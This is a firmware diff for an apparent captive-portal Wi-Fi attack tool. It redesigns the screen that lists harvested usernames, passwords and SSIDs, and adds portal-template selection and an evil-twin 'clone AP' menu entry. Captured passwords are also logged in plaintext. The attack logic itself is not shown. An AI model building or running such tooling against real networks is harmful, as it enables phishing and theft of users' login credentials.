+  tft.drawFastHLine(x + 7, cardY + 1, w - 14, UI_HIGHLIGHT);
+  tft.drawFastHLine(x + 7, cardY + kCredCardH - 2, w - 14, UI_SHADOW);
+  tft.fillRoundRect(x + 2, cardY + 9, 3, kCredCardH - 18, 2, UI_ACCENT);
+
+  char number[5];
+  snprintf(number, sizeof(number), "%02d", index + 1);
+  tft.fillRoundRect(11, cardY + 8, 25, 16, 4, UI_SHADOW);
+  tft.drawRoundRect(11, cardY + 8, 25, 16, 4, UI_ACCENT);
+  tft.setTextColor(UI_ACCENT, UI_SHADOW);
+  tft.setCursor(17, cardY + 12);
+  tft.print(number);
+
+  // Two spacious cards per page keep each captured field on its own row.
+  // This is intentionally less dense: credentials must be readable at a
+  // glance and the delete control must never float over the text.
+  tft.setTextColor(UI_DIM_TEXT, UI_FG);
+  tft.setCursor(43, cardY + 12);
+  tft.print(tr("SSID"));
+  tft.setTextColor(UI_TEXT, UI_FG);
+  tft.setCursor(73, cardY + 12);
+  tft.print(cpCredFitText(cred.ssid, 118));
+
+  tft.drawFastHLine(11, cardY + 31, 180, UI_SHADOW);
+
+  tft.fillRoundRect(11, cardY + 38, 180, 19, 4, UI_SHADOW);
+  tft.setTextColor(UI_DIM_TEXT, UI_FG);
+  tft.setCursor(16, cardY + 44);
+  tft.print(tr("User"));
+  tft.setTextColor(UI_TEXT, UI_SHADOW);
+  tft.setCursor(55, cardY + 44);
+  tft.print(cpCredFitText(cred.username, 130));
+
+  tft.fillRoundRect(11, cardY + 62, 180, 19, 4, UI_SHADOW);
+  tft.setTextColor(UI_DIM_TEXT, UI_FG);
+  tft.setCursor(16, cardY + 68);
+  tft.print(tr("Pass"));
+  tft.setTextColor(UI_TEXT, UI_SHADOW);
+  tft.setCursor(55, cardY + 68);
+  tft.print(cpCredFitText(cred.password, 130));
+
+  cpDrawCredentialDeleteButton(cardY, false);
+}
+
+static void cpDrawCredentialHeader(uint8_t count, int totalPages) {
+  // Small ID-card icon.
+  tft.drawRoundRect(6, kCredHeaderY + 2, 18, 14, 3, UI_ACCENT);
+  tft.fillCircle(11, kCredHeaderY + 7, 2, UI_ACCENT);
+  tft.drawFastHLine(8, kCredHeaderY + 12, 7, UI_ACCENT);
+  tft.drawFastHLine(17, kCredHeaderY + 6, 4, UI_DIM_TEXT);
+  tft.drawFastHLine(17, kCredHeaderY + 10, 4, UI_DIM_TEXT);
+
+  tft.setTextColor(UI_TEXT, TFT_BLACK);
+  tft.setCursor(30, kCredHeaderY + 4);
+  tft.print(cpCredFitText(tr("Credentials List:"), 202));
+
+  tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
+  tft.setCursor(8, kCredHeaderY + 18);
+  tft.print(tr("Page"));
+  tft.printf(" %d/%d", credPage + 1, totalPages);
+  tft.setCursor(198, kCredHeaderY + 18);
+  tft.printf("%02u/%02u", (unsigned)count, (unsigned)MAX_CREDS);
+  tft.drawFastHLine(5, kCredCardsY - 3, 230, UI_LINE);
+}
+
 void drawCredList() {
+  const uint8_t count = cpCredentialCount();
+  const int totalPages = max(1, ((int)count + kCredRowsPerPage - 1) /
+                                   kCredRowsPerPage);
+  credPage = constrain(credPage, 0, totalPages - 1);
+
   cportalUpdateNavLabels();
   wifiClearBody(TFT_BLACK);
-  tft.setTextColor(UI_TEXT, TFT_BLACK);
   tft.setTextSize(1);
-  tft.setCursor(0, 50);
-  tft.println("Credentials List:");
+  tft.setTextDatum(TL_DATUM);
+  cpDrawCredentialHeader(count, totalPages);
 
-  tft.setCursor(0, 70);
-  tft.print("User");
-  tft.setCursor(80, 70);
-  tft.print("Pass");
-  tft.setCursor(160, 70);
-  tft.print("SSID");
-  tft.drawFastHLine(0, 80, 245, UI_LINE);
+  Serial.printf("[cportal][nvs] reading %u credentials page=%d/%d\n",
+                (unsigned)count, credPage + 1, totalPages);
 
-  const uint8_t count = cpCredentialCount();
-  Serial.printf("[cportal][nvs] reading %u credentials\n", (unsigned)count);
-
-  int startIdx = credPage * kCredRowsPerPage;
-  int yOffset = 90;
-
+  const int startIdx = credPage * kCredRowsPerPage;
   if (count == 0) {
-    tft.setCursor(0, yOffset);
-    tft.println("No credentials");
+    const int boxY = kCredCardsY + 30;
+    tft.drawRoundRect(24, boxY, 192, 92, 8, UI_LINE);
+    tft.drawRoundRect(104, boxY + 15, 32, 25, 5, UI_ACCENT);
+    tft.fillCircle(120, boxY + 27, 3, UI_ACCENT);
+    tft.drawFastVLine(120, boxY + 29, 6, UI_ACCENT);
+    tft.setTextDatum(MC_DATUM);
+    tft.setTextColor(UI_TEXT, TFT_BLACK);
+    tft.drawString(tr("No credentials"), 120, boxY + 58);
+    tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
+    tft.drawString("0 / 20", 120, boxY + 75);
+    tft.setTextDatum(TL_DATUM);
     Serial.println("No credentials found");
   } else {
-    for (int i = startIdx; i < min((int)count, startIdx + kCredRowsPerPage); i++) {
+    const int endIdx = min((int)count, startIdx + kCredRowsPerPage);
+    for (int i = startIdx; i < endIdx; ++i) {
       Credential cred{};
       if (!cpReadCredential(i, cred)) {
         Serial.printf("[cportal][nvs] unreadable credential index=%d\n", i);
@@ -4039,27 +4831,15 @@ void drawCredList() {
       }
       Serial.printf("[cportal][nvs] credential %d: User=%s, Pass=%s, SSID=%s\n",
                     i, cred.username, cred.password, cred.ssid);
-
-      tft.setTextColor(WHITE, TFT_BLACK);
-      tft.setCursor(0, yOffset);
-      tft.println(cred.username);
-      tft.setCursor(80, yOffset);
-      tft.println(cred.password);
-      tft.setCursor(160, yOffset);
-      tft.println(cred.ssid);
-
-      tft.setTextColor(UI_WARN, TFT_BLACK);
-      tft.setCursor(223, yOffset - 1);
-      tft.println("X");
-
-      yOffset += 10;
+      const int cardY = kCredCardsY + (i - startIdx) *
+                        (kCredCardH + kCredCardGap);
+      cpDrawCredentialCard(i, cardY, cred);
     }
   }
 
   if (!featureHasTouchNavBar()) {
     const int buttonY = 290;
     tft.setTextColor(FEATURE_TEXT, TFT_BLACK);
-    tft.setTextSize(1);
     tft.setTextDatum(MC_DATUM);
 
     tft.fillRoundRect(5, buttonY, 50, 20, 8, DARK_GRAY);
@@ -4083,6 +4863,7 @@ void drawCredList() {
       tft.drawRoundRect(185, buttonY, 50, 20, 8, FEATURE_TEXT);
       tft.drawString("Next", 210, buttonY + 10);
     }
+    tft.setTextDatum(TL_DATUM);
   }
 }
 
@@ -4167,17 +4948,25 @@ void handleMainMenu(int x, int y) {
 
 void handleCredList(int x, int y) {
   const uint8_t count = cpCredentialCount();
-  int startIdx = credPage * kCredRowsPerPage;
-  int yOffset = 80;
+  const int startIdx = credPage * kCredRowsPerPage;
 
   for (int i = startIdx; i < min((int)count, startIdx + kCredRowsPerPage); i++) {
-    if (x >= 220 && x <= 230 && y >= yOffset - 3 && y <= yOffset + 7) {
+    const int cardY = kCredCardsY + (i - startIdx) *
+                      (kCredCardH + kCredCardGap);
+    const int deleteY = cardY + (kCredCardH - kCredDeleteH) / 2;
+    if (x >= kCredDeleteX && x < kCredDeleteX + kCredDeleteW &&
+        y >= deleteY && y < deleteY + kCredDeleteH) {
       Serial.println("Delete button pressed for credential " + String(i));
+      cpDrawCredentialDeleteButton(cardY, true);
+      delay(90);
       deleteCredential(i);
+      const uint8_t remaining = cpCredentialCount();
+      const int pages = max(1, ((int)remaining + kCredRowsPerPage - 1) /
+                                   kCredRowsPerPage);
+      if (credPage >= pages) credPage = pages - 1;
       drawCredList();
       return;
     }
-    yOffset += 10;
   }
 
   if (featureHasTouchNavBar()) {
@@ -4282,25 +5071,26 @@ void runUI() {
           activeIcon = -1;
           break;
         case 1:
-          currentScreen = CRED_LIST;
-          credPage = 0;
-          drawCredList();
+          cpSelectPortalTemplateFlow();
           animationState = 0;
           activeIcon = -1;
           break;
         case 2:
-          startAttack();
+          cpCloneExistingAPFlow();
           animationState = 0;
           activeIcon = -1;
           break;
         case 3:
-          stopAttack();
+          if (attackActive) stopAttack();
+          else startAttack();
           animationState = 0;
           activeIcon = -1;
           break;
 
          case 4:
-           cpCloneExistingAPFlow();
+           currentScreen = CRED_LIST;
+           credPage = 0;
+           drawCredList();
            animationState = 0;
            activeIcon = -1;
           break;
@@ -4318,16 +5108,23 @@ void runUI() {
   }
 
   static unsigned long lastTouchCheck = 0;
+  static bool credTouchLatched = false;
   const unsigned long touchCheckInterval = 50;
 
   if (millis() - lastTouchCheck >= touchCheckInterval) {
     int x, y;
-    if (feature_active && readTouchXY(x, y)) {
-     if (currentScreen == CRED_LIST) {
-      handleCredList(x, y);
-    } else {
-      handleMainMenu(x, y);
-    }
+    const bool touched = feature_active && readTouchXY(x, y);
+    if (!touched) credTouchLatched = false;
+    if (touched) {
+      if (currentScreen == CRED_LIST) {
+        // One delete action per touch. Holding the bin must never remove the
+        // next rows as the list shifts upward after a deletion.
+        if (!credTouchLatched) handleCredList(x, y);
+        credTouchLatched = true;
+      } else {
+        credTouchLatched = false;
+        handleMainMenu(x, y);
+      }
 
       if (toolbarIconHitY(y, iconY)) {
         for (int i = 0; i < ICON_NUM; i++) {
@@ -4363,14 +5160,16 @@ static void cportalUpdateNavLabels() {
                       "Exit",
                       s_clonePrevEn ? "Prev" : nullptr,
                       s_clonePickMode ? "Pick" : nullptr);
+  } else if (s_templateUiActive) {
+    setTouchNavLabels("Back", "Next", "Exit", "Prev", "Use");
   } else if (currentScreen == CRED_LIST) {
     const uint8_t count = cpCredentialCount();
     const bool hasPrev = credPage > 0;
     const bool hasNext = count > (credPage + 1) * kCredRowsPerPage;
     setTouchNavLabels("Back", "Clear", "Exit", "Export", hasNext ? "Next" : (hasPrev ? "Prev" : nullptr));
   } else {
-    setTouchNavLabels("SSID", "Creds", "Exit",
-                      attackActive ? "Stop" : "Start", "Clone");
+    setTouchNavLabels("HTML", "Creds", "Exit",
+                      attackActive ? "Stop" : "Start", "Twin");
   }
   redrawTouchButtonBar();
 }
@@ -4393,6 +5192,7 @@ static void cportalTeardown() {
   if (cpEnsureSdReady("exit")) {
     preserveMountedSdAcrossNextUiHandoff();
   }
+  s_portalTemplates.clear();
 }
 
 void cportalShutdown() {
@@ -4400,7 +5200,7 @@ void cportalShutdown() {
 }
 
 static void cportalHandleMainNavButtons() {
-  if (currentScreen != MAIN_MENU || s_cloneUiActive) {
+  if (currentScreen != MAIN_MENU || s_cloneUiActive || s_templateUiActive) {
     return;
   }
   const uint32_t now = millis();
@@ -4409,7 +5209,7 @@ static void cportalHandleMainNavButtons() {
   }
 
   if (isButtonPressedEdge(BTN_LEFT)) {
-    cpEditSsid();
+    cpSelectPortalTemplateFlow();
     cportalLastBtnMs = now;
     cportalWaitButtonRelease(BTN_LEFT);
     return;
@@ -4530,6 +5330,11 @@ void cportalSetup() {
   runUI();
 
   loadSSID();
+
+  // Validate the selected HTML while Wi-Fi is quiescent.  Request handlers
+  // stream it from SD in bounded chunks, so large portals do not require one
+  // contiguous heap allocation.
+  cpLoadConfiguredTemplate();
 
   startAttack();
 
